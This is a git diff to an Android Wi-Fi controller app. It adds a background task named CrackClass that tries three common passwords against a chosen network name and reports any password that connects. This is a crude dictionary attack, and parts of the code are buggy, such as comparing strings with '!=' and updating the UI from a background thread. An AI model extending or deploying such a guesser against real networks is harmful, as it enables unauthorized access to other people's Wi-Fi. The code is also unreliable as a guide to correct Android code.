@@ -1,7 +1,9 @@
 package com.example.user.wificontroller;
 
+import android.os.AsyncTask;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.support.v7.app.AppCompatDialogFragment;
 import android.view.View;
 import android.net.wifi.*;
 import android.content.Context;
@@ -40,17 +42,10 @@ public class MainActivity extends AppCompatActivity {
         TextView errorView = (TextView) findViewById(R.id.errorV);
         EditText ssidEdit = (EditText) findViewById(R.id.ssid);
         wifi.setWifiEnabled(true);
-
         String ssid = ssidEdit.getText().toString();
-        String passList[] = {"87654321","00000000","12345678"};
-        for(String i : passList){
-            if(connectToUnknown(wifi, ssid, i, true)){
-                errorView.append("ssid: " + ssid + "\r\n");
-                errorView.append("Pass: " + i + "\r\n");
 
-                break;
-            }
-        }
+        CrackClass cr = new CrackClass(wifi, ssid);
+        cr.execute();
     }
 
     public void connect(View view) throws InterruptedException {
@@ -97,7 +92,7 @@ public class MainActivity extends AppCompatActivity {
                 wifi.disconnect();
                 if(!silent)
                     errorView.append("Connecting to " + ("\"" + ssid + "\"\r\n") );
-                wifi.enableNetwork(i.networkId, false);
+                //wifi.enableNetwork(i.networkId, false);
                 boolean rs = wifi.enableNetwork(i.networkId, true);
                 if(!silent)
                     errorView.append("Enable network returned:" + rs + "\r\n");
@@ -123,14 +118,14 @@ public class MainActivity extends AppCompatActivity {
         WifiConfiguration wifiConf = new WifiConfiguration();
         wifiConf.SSID = ("\"" + ssid + "\"");
         wifiConf.preSharedKey = ("\"" + pass + "\"");
-        wifiConf.hiddenSSID = true;
-        wifiConf.status = WifiConfiguration.Status.ENABLED;
-        wifiConf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
-        wifiConf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
-        wifiConf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
-        wifiConf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
-        wifiConf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
-        wifiConf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
+        //wifiConf.hiddenSSID = true;
+        //wifiConf.status = WifiConfiguration.Status.ENABLED;
+        //wifiConf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
+        //wifiConf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
+        //wifiConf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
+        //wifiConf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
+        //wifiConf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
+        //wifiConf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
         int res = wifi.addNetwork(wifiConf);
         if(!silent)
             errorView.append("add Network returned " + res +"\r\n");
@@ -183,4 +178,53 @@ public class MainActivity extends AppCompatActivity {
         //wifi.removeNetwork(iid);
 
     }
+
+    protected class CrackClass extends AsyncTask<Integer, Integer, Integer>
+    {
+        String passList[] = {"00000000", "87654321", "12345678"};
+        WifiManager wifi = null;
+        String ssid;
+        TextView errorView = null;
+        CrackClass(WifiManager wifi, String ssid)
+        {
+            super();
+            this.wifi = wifi;
+            this.ssid = ssid;
+        }
+
+        @Override
+        protected void onPreExecute()
+        {
+            this.errorView = (TextView) findViewById(R.id.errorV);
+        }
+        @Override
+        protected Integer doInBackground(Integer... params)
+        {
+            WifiManager wifi = this.wifi;
+            WifiConfiguration wc = new WifiConfiguration();
+
+            wc.SSID = ("\"" + this.ssid + "\"");
+            for(String p : this.passList){
+                wc.preSharedKey = "\"" + p + "\"";
+                int nid = wifi.addNetwork(wc);
+                wifi.disconnect();
+                wifi.enableNetwork(nid, true);
+                wifi.reconnect();
+
+                WifiInfo wInfo = wifi.getConnectionInfo();
+                if(wInfo.getBSSID() != "00:00:00:00:00:00"){
+                    this.errorView.append("Found pass: " + p);
+                    break;
+                }
+                try {
+                    Thread.sleep(300);
+                }catch (InterruptedException e){
+                    e.printStackTrace();
+                }
+            }
+            return null;
+        }
+    }
+
 }
+
